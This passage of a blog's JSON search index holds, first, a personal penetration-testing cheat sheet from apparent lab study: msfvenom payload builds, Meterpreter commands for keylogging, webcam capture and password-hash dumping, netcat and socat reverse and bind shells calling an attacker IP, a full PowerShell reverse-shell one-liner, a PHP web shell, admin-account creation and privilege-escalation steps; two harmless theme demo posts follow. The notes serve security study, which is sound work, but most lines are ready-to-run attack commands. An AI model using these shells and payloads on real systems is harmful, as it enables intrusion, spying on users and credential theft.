encoded in Base64, and the output format was raw.Handlers  The term commonly used to receive a connection from a target is ‚Äòcatching a shell‚Äô.  Can be easily caught using a handler.  # msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php  use exploit/multi/handler Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.Other Payloads  Linux Executable and Linkable Format (elf)  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf  set payload linux/x86/meterpreter/reverse_tcp  Windows  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe  PHP  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php  ASP  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp  Python  msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.pytransfer  python3 -m http.server 9000  wget http://ATTACKING_10.10.217.15:9000/shell.elfMeterpreter  runs in target memory and does not write itself to the disk on the target, avoid detecion  Meterpreter will be seen as a process and not have a file on the target system.show different meterpreter version  # msfvenom --list payloads | grep meterpreterHow to choose version:  The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)  Components available on the target system (Is Python installed? Is this a PHP website? etc.)  Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)Meterpreter Commands  helpCore commands  background: Backgrounds the current session  exit: Terminate the Meterpreter session  guid: Get the session GUID (Globally Unique Identifier)  help: Displays the help menu  info: Displays information about a Post module  irb: Opens an interactive Ruby shell on the current session  load: Loads one or more Meterpreter extensions  migrate: Allows you to migrate Meterpreter to another process  run: Executes a Meterpreter script or Post module  sessions: Quickly switch to another sessionFile system commands  cd: Will change directory  ls: Will list files in the current directory (dir will also work)  pwd: Prints the current working directory  edit: will allow you to edit a file  cat: Will show the contents of a file to the screen  rm: Will delete the specified file  search: Will search for files  upload: Will upload a file or directory  download: Will download a file or directoryNetworking commands  arp: Displays the host ARP (Address Resolution Protocol) cache  ifconfig: Displays network interfaces available on the target system  netstat: Displays the network connections  portfwd: Forwards a local port to a remote service  route: Allows you to view and modify the routing tableSystem commands  clearev: Clears the event logs  execute: Executes a command  getpid: Shows the current process identifier  getuid: Shows the user that Meterpreter is running as  kill: Terminates a process  pkill: Terminates processes by name  ps: Lists running processes  reboot: Reboots the remote computer  shell: Drops into a system command shell  shutdown: Shuts down the remote computer  sysinfo: Gets information about the remote system, such as OSOthers Commands (these will be listed under different menu categories in the help menu)  idletime: Returns the number of seconds the remote user has been idle  keyscan_dump: Dumps the keystroke buffer  keyscan_start: Starts capturing keystrokes  keyscan_stop: Stops capturing keystrokes  screenshare: Allows you to watch the remote user‚Äôs desktop in real time  screenshot: Grabs a screenshot of the interactive desktop  record_mic: Records audio from the default microphone for X seconds  webcam_chat: Starts a video chat  webcam_list: Lists webcams  webcam_snap: Takes a snapshot from the specified webcam  webcam_stream: Plays a video stream from the specified webcam  getsystem: Attempts to elevate your privilege to that of local system  hashdump: Dumps the contents of the SAM databasePost-Exploitation with Meterpreter  getuid  ps  migrate 716 Meterpreter migrating to process ID 716.  hashdump  list the content of the SAM database, SAM (Security Account Manager),  search -f flag2.txt quickly find a flag or proof file  shell  getsystem  load python  load kiwiusage on a WINDOWS machine  set payload windows/meterpreter/reverse_tcp  sysinfo  hashdump  post/windows/gather/enum_domain  post/windows/gather/enum_shares  post/windows/manage/migrate  NTLM hash, the second hash after command hashdump, what is the first.  meterpreter &gt; search -f secrets.txt  meterpreter &gt; cat \"{file_path}\"Shelltool: set up listener  Netcat, Socat, Metasploit ‚Äì multi/handler,  PayloadsAllTheThings. Reverse Shell Cheat Sheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  pentestmonkey. Reverse Shell Cheat Sheet. https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  SecLists https://github.com/danielmiessler/SecListsTypes of ShellReverse shell.  attacker listen.  Reverse shells. need to configure your own network to accept the shell.  attack: sudo nc -lvnp 443  target: nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; -e /bin/bashBind shell.  target listen.  Bind shells. start a listener attached to a shell directly on the target.may be prevented by firewalls protecting the target.  target: nc -lvnp &lt;port&gt; -e \"cmd.exe\"  attacker: nc &lt;TARGET_IP&gt; &lt;port&gt;interactive or non-interactive  interactive: allow you to interact with programs after executing them.  Non-Interactive:Netcat  nc -lvnp &lt;port-number&gt; start listener of reverse shell  nc &lt;target-ip&gt; &lt;chosen-port&gt; obtain bind shellNetcat Shell StabilisationTechnique 1: Python  python -c 'import pty;pty.spawn(\"/bin/bash\")' spawn a better featured bash shell  export TERM=xterm able to use commands like clear  stty raw -echo; fg  Technique 2: rlwrap  gives us access to history, tab autocompletion and the arrow keys  sudo apt install rlwrap  rlwrap nc -lvnp &lt;port&gt; start listener  stty raw -echo; fgTechnique 3: Socat  socat static compiled binary (a version of the program compiled to have no dependencies)  sudo python3 -m http.server 80  wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat  Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\\\Windows\\temp\\socat.exechange your terminal tty size:  stty -a  stty rows &lt;number&gt;  stty cols &lt;number&gt;SocatReverse Shells  socat TCP-L:&lt;port&gt; - linux or windows  socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes Windows  socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:\"bash -li\" LinuxBind Shells  socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\" Linux  socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes Windows      socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; - linux or windows    socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0 listener  socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,saneSocat Encrypted Shells  openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt Generate a certificate. creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.  cat shell.key shell.crt &gt; shell.pem merge two into a single filereverse shell  socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called ‚Äúencrypt.pem‚Äù.  verify=0 tells the connection to not bother trying to validate.  certificate must be used on whichever device is listening.  socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash connect back  socat OPENSSL:10.10.10.5:53 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane your IP is 10.10.10.5, the syntax to connect back to this listener.  Bind shell  socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes target.  socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 - attacker.Common Shell Payloads  nc -lvnp &lt;PORT&gt; -e /bin/bash bind shell on the target  nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash reverse shell, connect backcreate a listener for a bind shell:  mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f  creates a named pipe at /tmp/f  connects the input of the listener to the output of the named pipe.  output of the netcat listener (i.e. the commands we send) then gets piped directly into sh.  nc reverse shell:  mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f  reverse power shell on Windows:  powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"Other reverse shell:  PayloadsAllTheThings  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.mdmsfvenomstandard  msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;Windows x64 Reverse Shell  ```` msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST= LPORT= ```  -f: format  -o: outputstaged meterpreter reverse shell for a 64bit Linux target  msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443Payload Naming Conventions  OS/arch/payload  eg. linux/x86/shell_reverse_tcp  eg. windows/x64/meterpreter/reverse_tcp staged payload  eg. linux/x86/meterpreter_reverse_tcp stageless payloadlist payloads:  msfvenom --list payloads | grep \"linux/x86/meterpreter\"Metasploit multi/handler  3 options:  payload, LHOST and LPORT.  exploit -j run in background.WebShellsphp  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;  usage. input in URL ‚Äú10.10.84.199/uploads/shell.php?cmd=ifconfig‚Äù  run ifconfig on server.pentestmonkey reverse shell  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php  a full reverse shell written in PHPNextTry to get access to user account  SSH keys stored at /home/&lt;user&gt;/.ssh  Windows eg, VNC servers frequently leave passwords in the registry stored in plaintext.  FileZilla FTP server also leave credentials in an XML filewindos add user:  net user &lt;username&gt; &lt;password&gt; /add  net localgroup administrators &lt;username&gt; /addpracticep1  nc -lnvp 4444 on attacker.  NC &lt;yourmachineip&gt; -e /bin.bash on target.  python3 -c 'import pty;pty.spawn(\"/bin/bash\")' on attacker, stabilizep2  /usr/share/webshells/php/php-reverse-shell.php change the IP to attacker`s.  nc -lnvp 1234 on attacker.  upload php-reverse-shell.php to server and run it.p3(nc REVERSE SHELL)  nc -lvnp 4444 attacker‚Äôs  nc &lt;tun0-ip&gt; 4444-e /bin/bash target‚Äôsp3(nc BIND SHELL)  nc  -lvnp 4444-e /bin/bash target‚Äôs terminal  nc &lt;target-ip&gt; 4444 attacker‚Äôs terminalp4(socat reverse shell linux)  socat TCP-L:4444 - attacker`s  socat TCP:&lt;tun0-ip&gt;:4444 EXEC:\"bash -li\" target`sp4(socat bind shell linux)  socat TCP-L:4444 EXEC:\"bash -li\" target`s  socat TCP:&lt;ip&gt;:4444 - attacker`sP5 other reverse shell techniques  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.mdp6  can not submit linux reverse shell to windowsp7 windows php reverse shell   &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;P8 Windows net command.  The ‚ÄúNet Accounts‚Äù command is used to set the policy settings on local computer, such as Account policies and password policies. This command can‚Äôt be used on domain controller. This command is only used on local computer.  add a user and add to administrators group.  net user USERNAME PASSWORD /ad  net localgroup administrators USERNAME /addp9 (nc reverse shell windows)  nc -lvnp 4444 attacker`s  nc &lt;tun0-ip&gt; 4444 -e \"cmd.exe\" target`sp9 (nc bind shell windows)  nc -lvnp 3333 -e \"cmd.exe\" target`s  nc &lt;target-ip&gt;  3333 attacker`sp9 (socat reverse shell windows)  socat TCP-L:8888 - attacker`s  socat TCP:&lt;tun0-ip&gt;:8888 EXEC:powershell.exe,pipes target`sp9 (socat bind shell windows)  socat TCP-L:4444EXEC:powershell.exe,pipes target`s  socat TCP:&lt;target-ip&gt;:4444- attacker`sp10 Create a 64bit Windows Meterpreter shell using msfvenom  create shell  msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=&lt;tun0-ip&gt; LPORT=4444  start a listenermsfconsoleuse multi/handlerset LHOST=&lt;tun0-ip&gt; ,set LPORT=4444set payload windows/x64/meterpreter/reverse_tcprun Linux PrivEscEnumeration  $ hostname hostname  $ uname -a  $ cat /proc/version kernel version  $ cat /etc/os-release system version  $ cat /etc/issue system version  ps -A  View all running processes  ps axjf View process tree  ps aux show processes for all users (a), display the user that launched the process (u),  processes that are not attached to a terminal (x)  netstat -a shows all listening ports and established connections.  netstat -at or netstat -au, show tcp or udp  netstat -l list ports in ‚Äúlistening‚Äù mode  find . -name flag1.txt find file in current directory  find /home -name flag1.txt find file in home directory  ind / -type d -name config find directory in /  find / -type f -perm 0777 find file with permission 777  find / -perm a=x find executable files  find /home -user frank  find / -mtime 10 find files modified in last 10 days.  find / -atime 10 find files access in last 10 days.  find / -cmin -60 find files changed in last 60 minutes.  find / -size 50M find files with size of 50m.  find / -size +100M find files larger than 100m.  find / -size +100M -type f 2&gt;/dev/null redirect errors to ‚Äú/dev/null‚Äù and have a cleaner outputAutomated Enumeration Tools  LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  LinEnum: https://github.com/rebootuser/LinEnum  LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester  Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration  Linux Priv Checker: https://github.com/linted/linuxprivcheckersudo  https://gtfobins.github.io/  find what we can do of a sudo programLeverage LD_PRELOAD  use LD_PRELOAD to cheat. https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/  random_num.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt; int main(){  srand(time(NULL));  int i = 10;  while(i--) printf(\"%d\\n\",rand()%100);  return 0;}  gcc random_num.c -o random_num  unrandom.cint rand(){    return 42; //the most random number in the universe}  gcc -shared -fPIC unrandom.c -o unrandom.so  LD_PRELOAD=$PWD/unrandom.so ./random_nums not random, but random when ./random_nums  export LD_PRELOAD=$PWD/unrandom.so set to env, and, not random even ./ random_nums  printenv LD_PRELOAD Check environment value  ldd random_nums Check program shared objectssuid  SUID (Set-user Identification) and SGID (Set-group Identification)  allow files to be executed with the permission level of the file owner or the group owner  find / -type f -perm -04000 -ls 2&gt;/dev/null  unshadow shadow.txt passwd.txt &gt; secret.txt  john --wordlist=/usr/share/wordlists/rockyou.txt secret.txtCapabilities  https://man7.org/linux/man-pages/man7/capabilities.7.html  getcap -r / 2&gt;/dev/nullcron jobs  cat /etc/crontabPATH  echo $PATH  find / -writable 2&gt;/dev/null find writable folders  find / -writable 2&gt;/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u  grep -v invert-match, select the non-matching lines. do not show ‚Äú/proc/{ID}‚Äù lines.  export PATH=/tmp:$PATH  when a root program ‚Äútest‚Äù with ‚ÄúSUID‚Äù bit set, and it calls system(\"thm\"), we need to add executable ‚Äúthm‚Äù to $PATH. And it can run as root after ‚Äútest‚Äù executed.NFS  Network File Sharing.  SSH, Telnet.  cat /etc/exports configurations  The critical element for this privilege escalation vector is the ‚Äúno_root_squash‚Äù option.  showmount -e {targetIP} on attackers`, to check the target opened path  mkdir {attacker_path}  mount -o rw {targetIP}:/{showed open path} {attacker_path}Windows Privescautomated enumeration script  winPEAS or PowerUp.ps1Manual checklist  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.mdVulnerable machine  https://github.com/sagishahar/lpeworkshopcommand:  whoami /priv Current user‚Äôs privileges  net users list users  net user {username} detail of a user  net localgroup User groups defined on the system  net localgroup {groupname} list members of a group  systeminfo show system information  systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" grep the outputsearch file:  findstr /si password *.txt  /si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)list updates installed on the target system:  wmic qfe get Caption,Description,HotFixID,InstalledOn  Windows Management Instrumentation (WMI)Network Connections: netstat -anoScheduled Tasks:schtasks, schtasks /query /fo LIST /vDrivers: driverqueryAntivirus: sc query windefend, sc queryex type=serviceTools:  WinPEAS winpeas.exe &gt; outputfile.txt https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  PowerUp https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  Windows Exploit Suggester. https://github.com/AonCyberLabs/Windows-Exploit-Suggesterwmic product get name,version,vendorDLL Hijacking  DLL search order  https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order  Process Monitor (ProcMon)Creating the malicious DLL file"
  },
  
  {
    "title": "Text and Typography",
    "url": "/posts/text-and-typography/",
    "categories": "dev",
    "tags": "jekyll, markdown",
    "date": "2019-08-08 11:33:00 +0800",
    





    "snippet": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let‚Äôs start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 - headingParagraphI wandered lonely as a cloudThat floats on high o‚Äôer vales and hills,When all at once I saw a crowd,A host, of golden daffodils;Beside the lake, beneath the trees,Fluttering and dancing in the breeze.ListsOrdered list  Firstly  Secondly  ThirdlyUnordered list  Chapter          Section                  Paragraph                    Task list  TODO  Completed  Defeat COVID-19          Vaccine production      Economic recovery      People smile again      Description list  Sun  the star around which the earth orbits  Moon  the natural satellite of the earth, visible by reflected light from the sunBlock Quote  This line shows the block quote.Prompts  An example showing the tip type prompt.  An example showing the info type prompt.  An example showing the warning type prompt.  An example showing the danger type prompt.Tables            Company      Contact      Country                  Alfreds Futterkiste      Maria Anders      Germany              Island Trading      Helen Bennett      UK              Magazzini Alimentari Riuniti      Giovanni Rovelli      Italy      Linkshttp://127.0.0.1:4000FootnoteClick the hook will locate the footnote1, and here is another footnote2.Images  Default (with caption)Full screen width and center alignment  Shadowshadow effect (visible in light mode)  Left aligned      Float to left    ‚ÄúA repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space.‚Äù        Float to right    ‚ÄúA repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space. A repetitive and meaningless text is used to fill the space.‚Äù  Mermaid SVG gantt  title  Adding GANTT diagram functionality to mermaid  apple :a, 2017-07-20, 1w  banana :crit, b, 2017-07-23, 1d  cherry :active, c, after b a, 1dMathematicsThe mathematics powered by MathJax:\\[\\sum_{n=1}^\\infty 1/n^2 = \\frac{\\pi^2}{6}\\]When $a \\ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are\\[x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}\\]Inline codeThis is an example of Inline Code.FilepathHere is the /path/to/the/file.extend.Code blockCommonThis is a common code snippet, without syntax highlight and line number.Specific LanguagesConsole$ env |grep SHELLSHELL=/usr/local/bin/bashPYENV_SHELL=bashShellif [ $? -ne 0 ]; then    echo \"The command was not successful.\";    #do the needful / exitfi;Specific filename@import  \"colors/light-typography\",  \"colors/dark-typography\"Reverse Footnote            The footnote source¬†&#8617;              The 2nd footnote source¬†&#8617;      "
  },
  
  {
    "title": "How to write a post",
    "url": "/posts/Write-A-Post/",
    "categories": "dev",
    "tags": "jekyll, git",
    "date": "2018-03-02 11:33:00 +0800",
    





    "snippet": "How to write a postSteps:  Create post(s) with .md format at zenbro.github.io/_posts  Run the bash     #! /bin/bash git clone https://github.com/YuchaoZheng88/zenbro.github.io.git cd zenbro.github.io git submodule init git submodule update cd YuchaoZheng88.github.io/ git checkout main cd .. bundle update jekyll build -d YuchaoZheng88.github.io cd YuchaoZheng88.github.io/        push YuchaoZheng88.github.io, then push main zenbro.github.io"
  }
  
]

